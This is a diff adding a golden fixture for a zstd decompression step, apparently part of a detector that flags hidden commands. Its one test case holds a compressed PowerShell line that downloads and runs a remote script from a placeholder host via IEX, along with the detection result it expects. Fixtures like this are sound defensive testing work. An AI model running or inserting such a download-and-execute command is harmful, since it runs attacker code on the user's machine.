@@ -1,0 +1,2 @@
+# zstd-decompress · Golden Fixtures · RC3.2a
+{"case_id": "zstd-plain-ps", "description": "Zstd stream \u2192 PowerShell IEX", "input": "(\u00b5/\u00fd (A\u0001\u0000powershell.exe -c \"IEX http://a.b/x.ps1\"", "detect_min_confidence": 0.3, "expected_output_contains": ["powershell", "IEX"]}
